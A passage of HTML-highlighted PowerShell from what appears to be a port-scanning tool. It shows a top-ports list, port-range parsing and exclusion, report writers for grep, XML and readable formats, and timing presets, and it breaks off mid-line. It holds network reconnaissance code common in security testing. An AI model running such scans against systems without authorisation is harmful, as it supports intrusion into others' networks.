class="hljs-number">54045</span>,<span class="hljs-number">54328</span>,<span class="hljs-number">55056</span>,<span class="hljs-number">56737</span>,<span class="hljs-number">57797</span>,<span class="hljs-number">60443</span>,<span class="hljs-number">70</span>,<span class="hljs-number">417</span>,<span class="hljs-number">714</span>,<span class="hljs-number">722</span>,<span class="hljs-number">777</span>,<span class="hljs-number">981</span>,<span class="hljs-number">1009</span>,<span class="hljs-number">2022</span>,<span class="hljs-number">4224</span>,<br>                        <span class="hljs-number">4998</span>,<span class="hljs-number">6346</span>,<span class="hljs-number">301</span>,<span class="hljs-number">524</span>,<span class="hljs-number">668</span>,<span class="hljs-number">765</span>,<span class="hljs-number">2041</span>,<span class="hljs-number">5999</span>,<span class="hljs-number">10082</span>,<span class="hljs-number">259</span>,<span class="hljs-number">1007</span>,<span class="hljs-number">1417</span>,<span class="hljs-number">1434</span>,<span class="hljs-number">1984</span>,<span class="hljs-number">2038</span>,<span class="hljs-number">2068</span>,<span class="hljs-number">4343</span>,<br>                        <span class="hljs-number">6009</span>,<span class="hljs-number">7004</span>,<span class="hljs-number">44443</span>,<span class="hljs-number">109</span>,<span class="hljs-number">687</span>,<span class="hljs-number">726</span>,<span class="hljs-number">911</span>,<span class="hljs-number">1461</span>,<span class="hljs-number">2035</span>,<span class="hljs-number">4125</span>,<span class="hljs-number">6006</span>,<span class="hljs-number">7201</span>,<span class="hljs-number">9103</span>,<span class="hljs-number">125</span>,<span class="hljs-number">481</span>,<span class="hljs-number">683</span>,<span class="hljs-number">903</span>,<br>                        <span class="hljs-number">1011</span>,<span class="hljs-number">1455</span>,<span class="hljs-number">2013</span>,<span class="hljs-number">2043</span>,<span class="hljs-number">2047</span>,<span class="hljs-number">6668</span>,<span class="hljs-number">6669</span>,<span class="hljs-number">256</span>,<span class="hljs-number">406</span>,<span class="hljs-number">843</span>,<span class="hljs-number">2042</span>,<span class="hljs-number">2045</span>,<span class="hljs-number">5998</span>,<span class="hljs-number">9929</span>,<span class="hljs-number">31337</span>,<span class="hljs-number">44442</span>,<br>                        <span class="hljs-number">1092</span>,<span class="hljs-number">1095</span>,<span class="hljs-number">1102</span>,<span class="hljs-number">1105</span>,<span class="hljs-number">1113</span>,<span class="hljs-number">1121</span>,<span class="hljs-number">1123</span>,<span class="hljs-number">1126</span>,<span class="hljs-number">1130</span>,<span class="hljs-number">1132</span>,<span class="hljs-number">1137</span>,<span class="hljs-number">1141</span>,<span class="hljs-number">1145</span>,<span class="hljs-number">1147</span>,<span class="hljs-number">1149</span>,<span class="hljs-number">1154</span>,<br>                        <span class="hljs-number">1164</span>,<span class="hljs-number">1165</span>,<span class="hljs-number">1166</span>,<span class="hljs-number">1174</span>,<span class="hljs-number">1185</span>,<span class="hljs-number">1187</span>,<span class="hljs-number">1192</span>,<span class="hljs-number">1198</span>,<span class="hljs-number">1213</span>,<span class="hljs-number">1216</span>,<span class="hljs-number">1217</span>,<span class="hljs-number">1233</span>,<span class="hljs-number">1236</span>,<span class="hljs-number">1244</span>,<span class="hljs-number">1259</span>,<span class="hljs-number">1277</span>,<br>                        <span class="hljs-number">1287</span>,<span class="hljs-number">1300</span>,<span class="hljs-number">1301</span>,<span class="hljs-number">1309</span>,<span class="hljs-number">1322</span>,<span class="hljs-number">1328</span>,<span class="hljs-number">1556</span>,<span class="hljs-number">1641</span>,<span class="hljs-number">1688</span>,<span class="hljs-number">1719</span>,<span class="hljs-number">1721</span>,<span class="hljs-number">1805</span>,<span class="hljs-number">1812</span>,<span class="hljs-number">1839</span>,<span class="hljs-number">1875</span>,<span class="hljs-number">1914</span>,<br>                        <span class="hljs-number">1971</span>,<span class="hljs-number">1972</span>,<span class="hljs-number">1974</span>,<span class="hljs-number">2099</span>,<span class="hljs-number">2170</span>,<span class="hljs-number">2196</span>,<span class="hljs-number">2200</span>,<span class="hljs-number">2288</span>,<span class="hljs-number">2366</span>,<span class="hljs-number">2382</span>,<span class="hljs-number">2557</span>,<span class="hljs-number">2800</span>,<span class="hljs-number">2910</span>,<span class="hljs-number">2920</span>,<span class="hljs-number">2968</span>,<span class="hljs-number">3007</span>,<br>                        <span class="hljs-number">3013</span>,<span class="hljs-number">3050</span>,<span class="hljs-number">3119</span>,<span class="hljs-number">3304</span>,<span class="hljs-number">3307</span>,<span class="hljs-number">3376</span>,<span class="hljs-number">3400</span>,<span class="hljs-number">3410</span>,<span class="hljs-number">3514</span>,<span class="hljs-number">3684</span>,<span class="hljs-number">3697</span>,<span class="hljs-number">3700</span>,<span class="hljs-number">3824</span>,<span class="hljs-number">3846</span>,<span class="hljs-number">3848</span>,<span class="hljs-number">3859</span>,<br>                        <span class="hljs-number">3863</span>,<span class="hljs-number">3870</span>,<span class="hljs-number">3872</span>,<span class="hljs-number">3888</span>,<span class="hljs-number">3907</span>,<span class="hljs-number">3916</span>,<span class="hljs-number">3931</span>,<span class="hljs-number">3941</span>,<span class="hljs-number">3957</span>,<span class="hljs-number">3963</span>,<span class="hljs-number">3968</span>,<span class="hljs-number">3969</span>,<span class="hljs-number">3972</span>,<span class="hljs-number">3990</span>,<span class="hljs-number">3993</span>,<span class="hljs-number">3994</span>,<br>                        <span class="hljs-number">4009</span>,<span class="hljs-number">4040</span>,<span class="hljs-number">4080</span>,<span class="hljs-number">4096</span>,<span class="hljs-number">4143</span>,<span class="hljs-number">4147</span>,<span class="hljs-number">4200</span>,<span class="hljs-number">4252</span>,<span class="hljs-number">4430</span>,<span class="hljs-number">4555</span>,<span class="hljs-number">4600</span>,<span class="hljs-number">4658</span>,<span class="hljs-number">4875</span>,<span class="hljs-number">4949</span>,<span class="hljs-number">5040</span>,<span class="hljs-number">5063</span>,<br>                        <span class="hljs-number">5074</span>,<span class="hljs-number">5151</span>,<span class="hljs-number">5212</span>,<span class="hljs-number">5223</span>,<span class="hljs-number">5242</span>,<span class="hljs-number">5279</span>,<span class="hljs-number">5339</span>,<span class="hljs-number">5353</span>,<span class="hljs-number">5501</span>,<span class="hljs-number">5807</span>,<span class="hljs-number">5812</span>,<span class="hljs-number">5818</span>,<span class="hljs-number">5823</span>,<span class="hljs-number">5868</span>,<span class="hljs-number">5869</span>,<span class="hljs-number">5899</span>,<br>                        <span class="hljs-number">5905</span>,<span class="hljs-number">5909</span>,<span class="hljs-number">5914</span>,<span class="hljs-number">5918</span>,<span class="hljs-number">5938</span>,<span class="hljs-number">5940</span>,<span class="hljs-number">5968</span>,<span class="hljs-number">5981</span>,<span class="hljs-number">6051</span>,<span class="hljs-number">6060</span>,<span class="hljs-number">6068</span>,<span class="hljs-number">6203</span>,<span class="hljs-number">6247</span>,<span class="hljs-number">6500</span>,<span class="hljs-number">6504</span>,<span class="hljs-number">6520</span>,<br>                        <span class="hljs-number">6550</span>,<span class="hljs-number">6600</span>)<br>            <span class="hljs-variable">$numPorts</span>--<br>            <span class="hljs-variable">$portList</span>.AddRange(<span class="hljs-variable">$topPortList</span>[<span class="hljs-number">0</span><span class="hljs-type">..</span><span class="hljs-variable">$numPorts</span>])<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Parse-Ports</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$Ports</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] <span class="hljs-variable">$pList</span><br>            )<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$pRange</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Ports</span>.Split(<span class="hljs-string">&quot;,&quot;</span>))<br>            &#123;<br><br>                <span class="hljs-comment">#-1 is a special case for ping</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pRange</span> <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;-1&quot;</span>)<br>                &#123;<br>                    <span class="hljs-variable">$pList</span>.Add([<span class="hljs-built_in">int</span>]<span class="hljs-variable">$pRange</span>)<br>                &#125;<br>                <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$pRange</span>.Contains(<span class="hljs-string">&quot;-&quot;</span>))<br>                &#123;<br>                    [<span class="hljs-built_in">int</span>[]] <span class="hljs-variable">$range</span> = <span class="hljs-variable">$pRange</span>.Split(<span class="hljs-string">&quot;-&quot;</span>)<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$range</span>.Count <span class="hljs-operator">-ne</span> <span class="hljs-number">2</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$pRange</span>.Split(<span class="hljs-string">&quot;-&quot;</span>)[<span class="hljs-number">0</span>] <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$pRange</span>.split(<span class="hljs-string">&quot;-&quot;</span>)[<span class="hljs-number">1</span>] <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;&quot;</span>)<br>                    &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Invalid port range&quot;</span><br>                    &#125;<br><br>                    <span class="hljs-variable">$pList</span>.AddRange(<span class="hljs-variable">$range</span>[<span class="hljs-number">0</span>]..<span class="hljs-variable">$range</span>[<span class="hljs-number">1</span>])<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-variable">$pList</span>.Add([<span class="hljs-built_in">int</span>]<span class="hljs-variable">$pRange</span>)<br>                &#125;<br><br>            &#125;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$p</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$pList</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$p</span> <span class="hljs-operator">-lt</span> <span class="hljs-literal">-1</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$p</span> <span class="hljs-operator">-gt</span> <span class="hljs-number">65535</span>)<br>                &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Port <span class="hljs-variable">$p</span> out of range&quot;</span><br>                &#125;<br>            &#125;<br>         &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Parse-IpPorts</span></span><br>        &#123;<br>           <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$PortFile</span><br>            )<br><br>            <span class="hljs-built_in">Get-Content</span> <span class="hljs-variable">$PortFile</span> | <span class="hljs-built_in">ForEach-Object</span> &#123;<br>                Parse<span class="hljs-literal">-Ports</span> <span class="hljs-literal">-Ports</span> <span class="hljs-variable">$_</span> <span class="hljs-literal">-pList</span> <span class="hljs-variable">$portList</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Remove-Ports</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$ExcludedPorts</span><br>            )<br><br>            [<span class="hljs-built_in">int</span>[]] <span class="hljs-variable">$ExcludedPorts</span> = <span class="hljs-variable">$ExcludedPorts</span>.Split(<span class="hljs-string">&quot;,&quot;</span>)<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$x</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$ExcludedPorts</span>)<br>            &#123;<br>                <span class="hljs-variable">$portList</span>.Remove(<span class="hljs-variable">$x</span>)<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Write-PortscanOut</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;Comment&quot;</span>)] [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$comment</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;HostOut&quot;</span>)] [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$outhost</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;HostOut&quot;</span>)] [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$isUp</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;HostOut&quot;</span>)] <span class="hljs-variable">$openPorts</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;HostOut&quot;</span>)] <span class="hljs-variable">$closedPorts</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;HostOut&quot;</span>)] <span class="hljs-variable">$filteredPorts</span>,<br>                [<span class="hljs-type">Parameter</span>()] [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$SkipDiscovery</span>,<br>                [<span class="hljs-type">Parameter</span>()] [<span class="hljs-type">System.IO.StreamWriter</span>] <span class="hljs-variable">$grepStream</span>,<br>                [<span class="hljs-type">Parameter</span>()] [<span class="hljs-type">System.Xml.XmlWriter</span>] <span class="hljs-variable">$xmlStream</span>,<br>                [<span class="hljs-type">Parameter</span>()] [<span class="hljs-type">System.IO.StreamWriter</span>] <span class="hljs-variable">$readableStream</span><br><br>            )<br>            <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$PSCmdlet</span>.ParameterSetName)<br>            &#123;<br>                <span class="hljs-string">&quot;Comment&quot;</span><br>                &#123;<br><br>                    <span class="hljs-built_in">Write-Verbose</span> <span class="hljs-variable">$comment</span><br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$grepStream</span>) &#123;<br>                        <span class="hljs-variable">$grepStream</span>.WriteLine(<span class="hljs-string">&quot;# &quot;</span> + <span class="hljs-variable">$comment</span>)<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$xmlStream</span>) &#123;<br>                        <span class="hljs-variable">$xmlStream</span>.WriteComment(<span class="hljs-variable">$comment</span>)<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$readableStream</span>) &#123;<br>                        <span class="hljs-variable">$readableStream</span>.WriteLine(<span class="hljs-variable">$comment</span>)<br>                    &#125;<br>                &#125;<br>                <span class="hljs-string">&quot;HostOut&quot;</span><br>                &#123;<br>                    <span class="hljs-variable">$oPort</span> = [<span class="hljs-built_in">string</span>]::join(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$openPorts</span>.ToArray())<br>                    <span class="hljs-variable">$cPort</span> = [<span class="hljs-built_in">string</span>]::join(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$closedPorts</span>.ToArray())<br>                    <span class="hljs-variable">$fPort</span> = [<span class="hljs-built_in">string</span>]::join(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$filteredPorts</span>.ToArray())<br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$grepStream</span>) &#123;<br>                       <span class="hljs-comment">#for grepstream use tabs - can be ugly, but easier for regex</span><br>                       <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isUp</span> <span class="hljs-operator">-and</span> !<span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                            <span class="hljs-variable">$grepStream</span>.writeline(<span class="hljs-string">&quot;Host: <span class="hljs-variable">$outhost</span>`tStatus: Up&quot;</span>)<br>                        &#125;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isUp</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$oPort</span> <span class="hljs-operator">-ne</span> <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                                <span class="hljs-variable">$grepStream</span>.writeline(<span class="hljs-string">&quot;Host: <span class="hljs-variable">$outhost</span>`tOpen Ports: <span class="hljs-variable">$oPort</span>&quot;</span>)<br>                            &#125;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cPort</span> <span class="hljs-operator">-ne</span> <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                                <span class="hljs-variable">$grepStream</span>.writeline(<span class="hljs-string">&quot;Host: <span class="hljs-variable">$outhost</span>`tClosed Ports: <span class="hljs-variable">$cPort</span>&quot;</span>)<br>                            &#125;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$fPort</span> <span class="hljs-operator">-ne</span> <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                                <span class="hljs-variable">$grepStream</span>.writeline(<span class="hljs-string">&quot;Host: <span class="hljs-variable">$outhost</span>`tFiltered Ports: <span class="hljs-variable">$fPort</span>&quot;</span>)<br>                            &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">elseif</span> (!<span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                            <span class="hljs-variable">$grepStream</span>.writeline(<span class="hljs-string">&quot;Host: <span class="hljs-variable">$outhost</span>`tStatus: Down&quot;</span>)<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$xmlStream</span>) &#123;<br>                        <span class="hljs-variable">$xmlStream</span>.WriteStartElement(<span class="hljs-string">&quot;Host&quot;</span>)<br><br>                        <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-variable">$outhost</span>)<br>                        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isUp</span>) &#123;<br>                                <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;Status&quot;</span>, <span class="hljs-string">&quot;Up&quot;</span>)<br>                             &#125;<br>                             <span class="hljs-keyword">else</span> &#123;<br>                                <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;Status&quot;</span>, <span class="hljs-string">&quot;Downs&quot;</span>)<br>                             &#125;<br>                        &#125;<br><br>                        <span class="hljs-variable">$xmlStream</span>.WriteStartElement(<span class="hljs-string">&quot;Ports&quot;</span>)<br>                        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$p</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$openPorts</span>) &#123;<br>                            <span class="hljs-variable">$xmlStream</span>.writestartElement(<span class="hljs-string">&quot;Port&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;id&quot;</span>, [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$p</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;state&quot;</span>, <span class="hljs-string">&quot;open&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteEndElement()<br><br>                        &#125;<br>                        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$p</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$closedPorts</span>) &#123;<br>                            <span class="hljs-variable">$xmlStream</span>.writestartElement(<span class="hljs-string">&quot;Port&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;id&quot;</span>, [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$p</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;state&quot;</span>, <span class="hljs-string">&quot;closed&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteEndElement()<br>                        &#125;<br>                        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$p</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$filteredPorts</span>) &#123;<br>                            <span class="hljs-variable">$xmlStream</span>.writestartElement(<span class="hljs-string">&quot;Port&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;id&quot;</span>, [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$p</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;state&quot;</span>, <span class="hljs-string">&quot;filtered&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteEndElement()<br>                        &#125;<br><br>                        <span class="hljs-variable">$xmlStream</span>.WriteEndElement()<br>                        <span class="hljs-variable">$xmlStream</span>.WriteEndElement()<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$readableStream</span>) &#123;<br>                        <span class="hljs-variable">$readableStream</span>.writeline(<span class="hljs-string">&quot;Porscan.ps1 scan report for <span class="hljs-variable">$outhost</span>&quot;</span>)<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isUp</span>) &#123;<br>                            <span class="hljs-variable">$readableStream</span>.writeline(<span class="hljs-string">&quot;Host is up&quot;</span>)<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isUp</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$SkipDiscovery</span>) &#123;<br><br>                            <span class="hljs-variable">$readableStream</span>.writeline((<span class="hljs-string">&quot;&#123;0,-10&#125;&#123;1,0&#125;&quot;</span> <span class="hljs-operator">-f</span> <span class="hljs-string">&quot;PORT&quot;</span>, <span class="hljs-string">&quot;STATE&quot;</span>))<br><br>                            [<span class="hljs-built_in">int</span>[]]<span class="hljs-variable">$allports</span> = <span class="hljs-variable">$openPorts</span> + <span class="hljs-variable">$closedPorts</span> + <span class="hljs-variable">$filteredPorts</span><br>                            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$p</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">$allports</span>| <span class="hljs-built_in">Sort-Object</span>))<br>                            &#123;<br>                                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$openPorts</span>.Contains(<span class="hljs-variable">$p</span>)) &#123;<br>                                    <span class="hljs-variable">$readableStream</span>.writeline((<span class="hljs-string">&quot;&#123;0,-10&#125;&#123;1,0&#125;&quot;</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$p</span>, <span class="hljs-string">&quot;open&quot;</span>))<br>                                &#125;<br>                                <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$closedPorts</span>.Contains(<span class="hljs-variable">$p</span>)) &#123;<br>                                    <span class="hljs-variable">$readableStream</span>.writeline((<span class="hljs-string">&quot;&#123;0,-10&#125;&#123;1,0&#125;&quot;</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$p</span>, <span class="hljs-string">&quot;closed&quot;</span>))<br>                                &#125;<br>                                <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$filteredPorts</span>.Contains(<span class="hljs-variable">$p</span>)) &#123;<br>                                    <span class="hljs-variable">$readableStream</span>.writeline((<span class="hljs-string">&quot;&#123;0,-10&#125;&#123;1,0&#125;&quot;</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$p</span>, <span class="hljs-string">&quot;filtered&quot;</span>))<br>                                &#125;<br>                            &#125;<br><br>                        &#125;<br>                        <span class="hljs-keyword">elseif</span>(!<span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                            <span class="hljs-variable">$readableStream</span>.writeline(<span class="hljs-string">&quot;Host is Down&quot;</span>)<br>                        &#125;<br>                        <span class="hljs-variable">$readableStream</span>.writeline(<span class="hljs-string">&quot;&quot;</span>)<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">#function for Powershell v2.0 to work</span><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Convert-SwitchtoBool</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] <span class="hljs-variable">$switchValue</span><br>            )<br>            <span class="hljs-keyword">If</span> (<span class="hljs-variable">$switchValue</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$True</span><br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$False</span><br>        &#125;<br><br>        <span class="hljs-keyword">try</span><br>        &#123;<br><br>            [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$SkipDiscovery</span> = <span class="hljs-built_in">Convert-SwitchtoBool</span> (<span class="hljs-variable">$SkipDiscovery</span>)<br>            [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$PingOnly</span> = <span class="hljs-built_in">Convert-SwitchtoBool</span> (<span class="hljs-variable">$PingOnly</span>)<br>            [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$quiet</span>  = <span class="hljs-built_in">Convert-SwitchtoBool</span> (<span class="hljs-variable">$quiet</span>)<br>            [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$ForceOverwrite</span>  = <span class="hljs-built_in">Convert-SwitchtoBool</span> (<span class="hljs-variable">$ForceOverwrite</span>)<br><br>            <span class="hljs-comment">#########</span><br>            <span class="hljs-comment">#parse arguments</span><br>            <span class="hljs-comment">#########</span><br><br>            [<span class="hljs-type">Environment</span>]::CurrentDirectory=(<span class="hljs-built_in">Get-Location</span> <span class="hljs-literal">-PSProvider</span> FileSystem).ProviderPath<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$PsCmdlet</span>.ParameterSetName <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;cmdHosts&quot;</span>)<br>            &#123;<br>                <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$h</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Hosts</span>)<br>                &#123;<br>                    Parse<span class="hljs-literal">-Hosts</span>(<span class="hljs-variable">$h</span>) | <span class="hljs-built_in">Out-Null</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                Parse<span class="hljs-literal">-ILHosts</span>(<span class="hljs-variable">$HostFile</span>) | <span class="hljs-built_in">Out-Null</span><br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ExcludeHosts</span>)<br>            &#123;<br>                Exclude<span class="hljs-literal">-Hosts</span>(<span class="hljs-variable">$ExcludeHosts</span>)<br>            &#125;<br>            <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$TopPorts</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$Ports</span>) <span class="hljs-operator">-or</span> (<span class="hljs-variable">$TopPorts</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$PortFile</span>))<br>            &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Cannot set topPorts with other specific ports&quot;</span><br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Ports</span>)<br>            &#123;<br>                Parse<span class="hljs-literal">-Ports</span> <span class="hljs-literal">-Ports</span> <span class="hljs-variable">$Ports</span> <span class="hljs-literal">-pList</span> <span class="hljs-variable">$portList</span> | <span class="hljs-built_in">Out-Null</span><br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$PortFile</span>)<br>            &#123;<br>                Parse<span class="hljs-literal">-IpPorts</span>(<span class="hljs-variable">$PortFile</span>) | <span class="hljs-built_in">Out-Null</span><br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$portList</span>.Count <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$TopPorts</span>)<br>                &#123;<br>                    <span class="hljs-built_in">Get-TopPort</span>(<span class="hljs-variable">$TopPorts</span>) | <span class="hljs-built_in">Out-Null</span><br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-comment">#if the ports still aren&#x27;t set, give the deftault, top 50 ports</span><br>                    <span class="hljs-built_in">Get-TopPort</span>(<span class="hljs-number">50</span>) | <span class="hljs-built_in">Out-Null</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ExcludedPorts</span>)<br>            &#123;<br>                <span class="hljs-built_in">Remove-Ports</span> <span class="hljs-literal">-ExcludedPorts</span> <span class="hljs-variable">$ExcludedPorts</span> | <span class="hljs-built_in">Out-Null</span><br>            &#125;<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$T</span>)<br>            &#123;<br>                <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$T</span>)<br>                &#123;<br>                    <span class="hljs-number">5</span> &#123;<span class="hljs-variable">$nHosts</span>=<span class="hljs-number">30</span>;  <span class="hljs-variable">$Threads</span> = <span class="hljs-number">1000</span>; <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">750</span> &#125;<br>                    <span class="hljs-number">4</span> &#123;<span class="hljs-variable">$nHosts</span>=<span class="hljs-number">25</span>;  <span class="hljs-variable">$Threads</span> = <span class="hljs-number">1000</span>; 